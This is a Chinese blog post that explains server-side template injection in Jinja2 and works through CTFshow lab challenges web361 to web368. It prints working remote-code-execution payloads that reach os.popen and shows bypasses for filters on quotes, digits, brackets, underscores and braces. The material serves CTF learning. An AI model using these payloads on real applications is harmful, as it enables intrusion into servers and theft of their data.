<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#FFF"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png"><link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="alternate" type="application/rss+xml" title="低头学习  抬头看路" href="https://nnnpc.github.io/rss.xml"><link rel="alternate" type="application/atom+xml" title="低头学习  抬头看路" href="https://nnnpc.github.io/atom.xml"><link rel="alternate" type="application/json" title="低头学习  抬头看路" href="https://nnnpc.github.io/feed.json"><link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext"><link rel="stylesheet" href="/css/app.css?v=0.2.5"><meta name="keywords" content="WEB"><link rel="canonical" href="https://nnnpc.github.io/2024/04/16/SSTI%E5%AD%A6%E4%B9%A0/"><title>SSTI学习 - WEB | nnnpc's Blog = 低头学习 抬头看路 = 很多人已经做到了，而他们都曾经和现在的你站在同样的起点上</title><meta name="generator" content="Hexo 6.3.0"></head><body itemscope itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="container"><header id="header" itemscope itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline">SSTI学习</h1><div class="meta"><span class="item" title="创建时间：2024-04-16 13:58:19"><span class="icon"><i class="ic i-calendar"></i> </span><span class="text">发表于</span> <time itemprop="dateCreated datePublished" datetime="2024-04-16T13:58:19+08:00">2024-04-16</time></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="切换导航栏"><span class="line"></span> <span class="line"></span> <span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">nnnpc's Blog</a></li></ul><ul class="right"><li class="item theme"><i class="ic i-sun"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div id="imgs" class="pjax"><img src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/1.jpg"></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"/></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"/><use xlink:href="#gentle-wave" x="48" y="3"/><use xlink:href="#gentle-wave" x="48" y="5"/><use xlink:href="#gentle-wave" x="48" y="7"/></g></svg></div><main><div class="inner"><div id="main" class="pjax"><div class="article wrap"><div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i> <span><a href="/">首页</a></span><i class="ic i-angle-right"></i> <span class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/WEB/" itemprop="item" rel="index" title="分类于 WEB"><span itemprop="name">WEB</span></a><meta itemprop="position" content="1"></span></div><article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://nnnpc.github.io/2024/04/16/SSTI%E5%AD%A6%E4%B9%A0/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/avatar.jpg"><meta itemprop="name" content="nnnpc"><meta itemprop="description" content="很多人已经做到了，而他们都曾经和现在的你站在同样的起点上, 欢迎来交流学习"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="低头学习  抬头看路"></span><div class="body md" itemprop="articleBody"><h1 id="ssti学习"><a class="anchor" href="#ssti学习">#</a> SSTI 学习</h1><p>SSTI (Server-Side Template Injection) 又称服务器端模板注入</p><p>用户的输入先进入 Controller 控制器，然后根据请求类型和请求的指令发送给对应 Model 业务模型进行业务逻辑判断，数据库存取，最后把结果返回给 View 视图层，经过模板渲染展示给用户</p><p>模板通俗来讲就是拥有一个固定的格式，等着进行填充</p><h2 id="漏洞原理"><a class="anchor" href="#漏洞原理">#</a> 漏洞原理</h2><p>服务端在接收到用户的输入之后，并未做出有效的处理而导致用户可以输入一些攻击语句让模板引擎进行编译渲染，执行了攻击语句，从而达到了攻击者需要的效果</p><h2 id="继承关系"><a class="anchor" href="#继承关系">#</a> 继承关系</h2><p>接下来说说该漏洞点该如何进行利用，最主要的就是搞清楚继承的关系，接着就是绕过。因此，搞清楚继承关系对后续的注入有很大的帮助</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">class A:</span><br><span class="line"></span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">class B(A):</span><br><span class="line"></span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">class C(B):</span><br><span class="line"></span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">class D(C):</span><br><span class="line"></span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">f = C()</span><br><span class="line"></span><br><span class="line">print(f)</span><br></pre></td></tr></table></figure><p></p><p>这里 B 继承了 A，C 又继承了 B，以次类推，并且创建了 C 的对象 f，这里介绍第一个魔术方法</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(f.__class__)</span><br></pre></td></tr></table></figure><p></p><p>该魔术方法可以用来找到该对象当前所在的类</p><p>接下来返回到它的父类也就是 B，所用的魔术方法为：</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(f.__class__.__base__)</span><br></pre></td></tr></table></figure><p></p><p>当然，如果想再返回 B 的父类也就是 A，再跟上一个 base 即可</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(f.__class__.__base__.__base__)</span><br></pre></td></tr></table></figure><p></p><p>那么疑问来了，在这里 A 并没有被设定成谁的子类，如果再返回他的父类会到哪呢？</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(f.__class__.__base__.__base__.__base__)</span><br></pre></td></tr></table></figure><p></p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231205150431556.png" alt=""></p><p>发现 A 类的父类是 object 类，当一个类没有显式指定它是继承某个类的时候，它就会默认继承 object 类</p><p>在这里能看到从一个子类到父类的过程是用 base 魔术方法，但这样比较冗长，可以直接使用 mro 魔术方法来列出所有父类</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(f.__class__.__mro__)</span><br></pre></td></tr></table></figure><p></p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231205151555259.png" alt=""></p><p>再和数组一样跟上下标来选择自己需要的父类在这里 object 就是 3，因此</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(f.__class__.__mro__[3])</span><br></pre></td></tr></table></figure><p></p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231205151708060.png" alt=""></p><p>到这里为止，我们拿到了 object 类，自然是可以查找到 object 类中的所有子类，来选取可以利用的子类进行 rce。使用 subclasses 魔术方法来列出当前所在类的所有子类</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(f.__class__.__mro__[3].__subclasses__())</span><br></pre></td></tr></table></figure><p></p><p>同样通过下标来选择需要用到的子类，这里用到 &lt; class<br>'os._wrap_close'&gt;，在我这是 139</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(f.__class__.__mro__[3].__subclasses__()[139])</span><br></pre></td></tr></table></figure><p></p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231205152724475.png" alt=""></p><p>成功拿到 os 子类，接下来使用魔术方法 init 进行一下初始化</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(f.__class__.__mro__[3].__subclasses__()[139].__init__)</span><br></pre></td></tr></table></figure><p></p><p>接着使用魔术方法 globals 获取 function 所处空间下可使用的 module、方法以及所有变量</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(f.__class__.__mro__[3].__subclasses__()[139].__init__.__globals__)</span><br></pre></td></tr></table></figure><p></p><p>接着用 read 来读取子进程的输出</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(f.__class__.__mro__[3].__subclasses__()[139].__init__.__globals__[&#x27;popen&#x27;](&#x27;ls&#x27;).read())</span><br></pre></td></tr></table></figure><p></p><p>这样就是一条完整的注入 payload 了，进行了远程 rce，执行了 ls 命令</p><p><strong>总结：简单来说，就是在接收用户输入时没有做好安全过滤，导致在模板渲染时执行了用户的恶意输入，造成了注入漏洞。而我们利用这一漏洞使用魔术方法调回 object 类，并使用它的可执行的子类来进行 rce</strong></p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__class__   ：返回类型所属的对象</span><br><span class="line"></span><br><span class="line">__mro__     ：返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</span><br><span class="line"></span><br><span class="line">__base__   ：返回该对象所继承的父类</span><br><span class="line"></span><br><span class="line">__mro__     ：返回该对象的所有父类</span><br><span class="line"></span><br><span class="line">__subclasses__()  获取当前类的所有子类</span><br><span class="line"></span><br><span class="line">__init__  类的初始化方法</span><br><span class="line"></span><br><span class="line">__globals__  获取function所处空间下可使用的module、方法以及所有变量</span><br></pre></td></tr></table></figure><p></p><h2 id="实例"><a class="anchor" href="#实例">#</a> 实例</h2><p>既然了解了漏洞原理和注入方法，那接下来就来进行实操，以下实例均来自 ctfshow 的 web 入门靶场</p><h3 id="web361"><a class="anchor" href="#web361">#</a> web361</h3><p>利用 name 进行 get 传参，先尝试一下漏洞是否存在，能不能被正常执行</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;7\*7&#125;&#125;</span><br></pre></td></tr></table></figure><p></p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231205160528509.png" alt=""></p><p>成功，接下来根据之前的流程来进行 rce，先用 mro 列出所有父类</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;&quot;&quot;.__class__.__mro__&#125;&#125;</span><br></pre></td></tr></table></figure><p></p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231205160730810.png" alt=""></p><p>发现标号 1 即可返回到 object 类</p><p>接着列出所有子类</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()&#125;&#125;</span><br></pre></td></tr></table></figure><p></p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231205160840957.png" alt=""></p><p>找到 &lt;class 'os._wrap_close'&gt; 大概在 132 左右</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()[132]&#125;&#125;</span><br></pre></td></tr></table></figure><p></p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231205160911199.png" alt=""></p><p>初始化并利用进行 rce</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__[&#x27;popen&#x27;](&#x27;ls /&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p></p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231205161244100.png" alt=""></p><p>根目录下存在 flag，改变命令为 cat /flag 即可</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__[&#x27;popen&#x27;](&#x27;cat /flag&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p></p><p><strong>总结：本题没有进行任何过滤，因此只要找到环境中的 object 的类、子类以及方法和变量所在的位置就可以</strong></p><h3 id="web362"><a class="anchor" href="#web362">#</a> web362</h3><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231205162107943.png" alt=""></p><p>用 361 的 payload 发现打不通了，应该是过滤了一些东西，进一步进行排查</p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231205162304412.png" alt=""></p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231205162318642.png" alt=""></p><p>发现是其中的 2、3 数字被过滤了，很简单，利用全角数字代替正常数字，效果是一样的，进行过滤绕过</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()[１３２].__init__.__globals__[&#x27;popen&#x27;](&#x27;cat /flag&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p></p><p><strong>总结：本题过滤了数字，但只要使用同样能被执行的类型就可以实现绕过</strong></p><h3 id="web363"><a class="anchor" href="#web363">#</a> web363</h3><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231205194231943.png" alt=""></p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231205194302538.png" alt=""></p><p>经过尝试可以发现，本题中单引号双引号都被过滤了，用 [] 进行代替</p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231205194547828.png" alt=""></p><p>那么问题来了，按照原先的 payload 后面的 popen 和 ls 也需要单引号的包裹才能实现 rce，但这里明显行不通，只能换一种方法</p><p>利用传参的方式将引号包裹的参数传递进去：request.args.a</p><p>构造 payload：</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;[].__class__.__mro__[1].__subclasses__()[132].__init__.__globals__[request.args.a](request.args.b).read()&#125;&#125;&amp;a=popen&amp;b=ls</span><br></pre></td></tr></table></figure><p></p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231206131731543.png" alt=""></p><p>成功绕过，读取 flag</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;[].__class__.__mro__[1].__subclasses__()[132].__init__.__globals__[request.args.a](request.args.b).read()&#125;&#125;&amp;a=popen&amp;b=cat /flag</span><br></pre></td></tr></table></figure><p></p><p><strong>总结：本题过滤了单引号，导致普通的 globals 跟上 popen 的方法使用不了，于是利用了传参的方法将单引号内包裹的内容进行传入实现绕过</strong></p><h3 id="web364"><a class="anchor" href="#web364">#</a> web364</h3><p>用上一题的 payload 是打不通了，经尝试发现是 args 被 ban 了，但传参的方法依然是可以使用的，将 args 替换成 values 能实现同样的效果</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;[].__class__.__mro__[1].__subclasses__()[132].__init__.__globals__[request.values.a](request.values.b).read()&#125;&#125;&amp;a=popen&amp;b=cat /flag</span><br></pre></td></tr></table></figure><p></p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231206132402520.png" alt=""></p><p>成功绕过拿到 flag</p><p><strong>总结：本题相比上一题就把 args<br>ban 了，替换成 values 能实现同样的效果，成功绕过</strong></p><h3 id="web365"><a class="anchor" href="#web365">#</a> web365</h3><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231206133334887.png" alt=""></p><p>一开始使用 class 魔术方法时就发现中括号被增加过滤了，对象可以使用 () 等字符来代替，但是后面的 subclasses 等魔术方法都需要中括号来选择下标，这里使用<strong> getitem</strong> () 方法来代替 [] 实现绕过。</p><p>使用方法举例：</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">前：.__subclasses__()[132]</span><br><span class="line"></span><br><span class="line">后：.__subclasses__().__getitem__(132)</span><br></pre></td></tr></table></figure><p></p><p>能实现和中括号相同的效果，这里使用<strong> getitem</strong> () 方法来进行绕过试试（其实就是用<strong> getitem</strong> () 方法来代替 payload 中的所有 []）</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;().__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(132).__init__.__globals__.__getitem__(request.values.a)(request.values.b).read()&#125;&#125;&amp;a=popen&amp;b=ls</span><br></pre></td></tr></table></figure><p></p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231206134805952.png" alt=""></p><p>成功绕过，读取 flag</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;().__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(132).__init__.__globals__.__getitem__(request.values.a)(request.values.b).read()&#125;&#125;&amp;a=popen&amp;b=cat /flag</span><br></pre></td></tr></table></figure><p></p><p><strong>总结：本题增加过滤了中括号，利用 getitem () 方法来代替中括号实现绕过</strong></p><h3 id="web366"><a class="anchor" href="#web366">#</a> web366</h3><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231206140444508.png" alt=""></p><p>发现下划线被过滤了，那么同样需要使用传参的方法去传递<strong> class</strong> () 等魔术方法来实现对下划线的绕过，这里需要用 | attr () 来代替原先的。的写法</p><p>例如：</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">().__class__</span><br><span class="line"></span><br><span class="line">()|attr(&quot;__class__&quot;)</span><br></pre></td></tr></table></figure><p></p><p>这两种方法所实现的效果是一样的，这里被过滤了下划线，因此利用传参的方法来构造 payload</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()|attr(request.values.a)&#125;&#125;&amp;a=__class__</span><br></pre></td></tr></table></figure><p></p><p>完整 payload：</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;(()|attr(request.values.a)|attr(request.values.b)|attr(request.values.c)()|attr(request.values.d)(132)|attr(request.values.e)|attr(request.values.f)|attr(request.values.g)(request.values.h)(request.values.i)).read()&#125;&#125;&amp;a=__class__&amp;b=__base__&amp;c=__subclasses__&amp;d=__getitem__&amp;e=__init__&amp;f=__globals__&amp;g=__getitem__&amp;h=popen&amp;i=cat /flag</span><br></pre></td></tr></table></figure><p></p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231206144623859.png" alt=""></p><p>成功绕过，但是这样的 payload 比较冗长，检查起来也比较麻烦，所以想办法精简一下</p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231206144819010.png" alt=""></p><p>这里可以使用 lipsum 方法，跟上 globals 魔术方法能实现直接调用 os 执行命令的功能</p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231206145221279.png" alt=""></p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;lipsum.__globals__.os.popen(&#x27;cat /flag&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure><p></p><p>修改后 pyaload：</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;(lipsum|attr(request.values.a)).os.popen(request.values.b).read()&#125;&#125;&amp;a=__globals__&amp;b=cat /flag</span><br></pre></td></tr></table></figure><p></p><p>成功绕过获得 flag</p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231206150900872.png" alt=""></p><p><strong>总结：本题 ban 了下划线，那么同样需要用传参的方式传入魔术方法，用 | attr (&quot;class&quot;) 来等效替代了原先的.class 并同样使用 request 进行传入，这样导致 payload 十分冗长，于是利用 lipsum 跟上 globals 直接执行 os 来缩短 payload 的长度</strong></p><h3 id="web367"><a class="anchor" href="#web367">#</a> web367</h3><p>发现 os 被过滤了，同样传参进去进行绕过，这里需要使用 get 方法</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read()&#125;&#125;&amp;a=__globals__&amp;b=os&amp;c=cat /flag</span><br></pre></td></tr></table></figure><p></p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231206154410790.png" alt=""></p><p><strong>总结：os 被增加过滤，使用 get 方法进行传参传入绕过限制</strong></p><h3 id="web368"><a class="anchor" href="#web368">#</a> web368</h3><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231206155937380.png" alt=""></p><p>这次发现连花括号都直接过滤了，使用以下方法进行包裹绕过</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% print() %&#125;</span><br></pre></td></tr></table></figure><p></p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231206155135055.png" alt=""></p><p>将 367 中的 payload 修改一下，用上述绕过方法进行包裹</p><p>payload：</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;% print((lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read()) %&#125;&amp;a=__globals__&amp;b=os&amp;c=cat /flag</span><br></pre></td></tr></table></figure><p></p><p><img data-src="https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231206155240331.png" alt=""></p><p>成功绕过</p><p><strong>总结：过滤了花括号，使用其他方式进行包裹绕过</strong></p><div class="tags"><a href="/tags/WEB/" rel="tag"><i class="ic i-tag"></i> WEB</a></div></div><footer><div class="meta"><span class="item"><span class="icon"><i class="ic i-calendar-check"></i> </span><span class="text">更新于</span> <time title="修改时间：2024-04-16 17:05:43" itemprop="dateModified" datetime="2024-04-16T17:05:43+08:00">2024-04-16</time></span></div><div id="copyright"><ul><li class="author"><strong>本文作者： </strong>nnnpc <i class="ic i-at"><em>@</em></i>低头学习 抬头看路</li><li class="link"><strong>本文链接：</strong> <a href="https://nnnpc.github.io/2024/04/16/SSTI%E5%AD%A6%E4%B9%A0/" title="SSTI学习">https://nnnpc.github.io/2024/04/16/SSTI学习/</a></li><li class="license"><strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"><a href="/2024/04/16/Socket%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;nnnpc-1311441040.cos.ap-shanghai.myqcloud.com&#x2F;1.jpg" title="Socket网络编程"><span class="type">上一篇</span> <span class="category"><i class="ic i-flag"></i> python</span><h3>Socket网络编程</h3></a></div><div class="item right"><a href="/2024/04/16/TLS%E6%B5%81%E9%87%8F%E8%A7%A3%E5%AF%86/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;nnnpc-1311441040.cos.ap-shanghai.myqcloud.com&#x2F;1.jpg" title="TLS流量解密"><span class="type">下一篇</span> <span class="category"><i class="ic i-flag"></i> MISC</span><h3>TLS流量解密</h3></a></div></div><div class="wrap" id="comments"></div></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="文章目录"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ssti%E5%AD%A6%E4%B9%A0"><span class="toc-number">1.</span> <span class="toc-text">SSTI 学习</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">1.1.</span> <span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%A7%E6%89%BF%E5%85%B3%E7%B3%BB"><span class="toc-number">1.2.</span> <span class="toc-text">继承关系</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E4%BE%8B"><span class="toc-number">1.3.</span> <span class="toc-text">实例</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web361"><span class="toc-number">1.3.1.</span> <span class="toc-text">web361</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web362"><span class="toc-number">1.3.2.</span> <span class="toc-text">web362</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web363"><span class="toc-number">1.3.3.</span> <span class="toc-text">web363</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web364"><span class="toc-number">1.3.4.</span> <span class="toc-text">web364</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web365"><span class="toc-number">1.3.5.</span> <span class="toc-text">web365</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web366"><span class="toc-number">1.3.6.</span> <span class="toc-text">web366</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web367"><span class="toc-number">1.3.7.</span> <span class="toc-text">web367</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web368"><span class="toc-number">1.3.8.</span> <span class="toc-text">web368</span></a></li></ol></li></ol></li></ol></div><div class="related panel pjax" data-title="系列文章"><ul><li><a href="/2024/04/16/bugku%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB1-2/" rel="bookmark" title="bugku文件包含1-2">bugku文件包含1-2</a></li><li><a href="/2024/04/16/CTFshow%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="bookmark" title="CTFshow命令执行">CTFshow命令执行</a></li><li><a href="/2024/04/16/CTFshow%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="bookmark" title="CTFshow文件包含">CTFshow文件包含</a></li><li><a href="/2024/04/16/CTFshow%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0151-170/" rel="bookmark" title="CTFshow文件上传151-170">CTFshow文件上传151-170</a></li><li><a href="/2024/04/16/CTFshow%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%861-20/" rel="bookmark" title="CTFshow信息收集1-20">CTFshow信息收集1-20</a></li><li class="active"><a href="/2024/04/16/SSTI%E5%AD%A6%E4%B9%A0/" rel="bookmark" title="SSTI学习">SSTI学习</a></li></ul></div><div class="overview panel" data-title="站点概览"><div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="image" itemprop="image" alt="nnnpc" data-src="/images/avatar.jpg"><p class="name" itemprop="name">nnnpc</p><div class="description" itemprop="description">欢迎来交流学习</div></div><nav class="state"><div 